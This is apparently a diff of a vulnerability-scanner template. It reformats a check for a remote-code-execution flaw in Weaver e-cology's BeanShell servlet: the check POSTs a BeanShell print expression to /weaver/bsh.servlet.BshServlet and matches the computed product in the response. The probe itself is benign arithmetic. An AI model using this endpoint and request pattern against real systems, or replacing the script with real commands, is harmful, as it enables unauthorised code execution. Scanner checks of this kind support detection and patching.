@@ -1,16 +1,20 @@
 name: poc-yaml-ecology-javabeanshell-rce
+manual: true
+transport: http
 set:
-  r1: randomInt(40000, 44800)
-  r2: randomInt(40000, 44800)
+    r1: randomInt(40000, 44800)
+    r2: randomInt(40000, 44800)
 rules:
-  - method: POST
-    path: /weaver/bsh.servlet.BshServlet
-    body: >-
-      bsh.script=print%28{{r1}}*{{r2}}%29&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw
-    follow_redirects: false
-    expression: |
-      response.status == 200 && response.body.bcontains(bytes(string(r1 * r2)))
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /weaver/bsh.servlet.BshServlet
+            body: bsh.script=print%28{{r1}}*{{r2}}%29&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(bytes(string(r1 * r2)))
+expression: r0()
 detail:
-  author: l1nk3r
-  links:
-    - https://www.weaver.com.cn/cs/securityDownload.asp
+    author: l1nk3r
+    links:
+        - https://www.weaver.com.cn/cs/securityDownload.asp
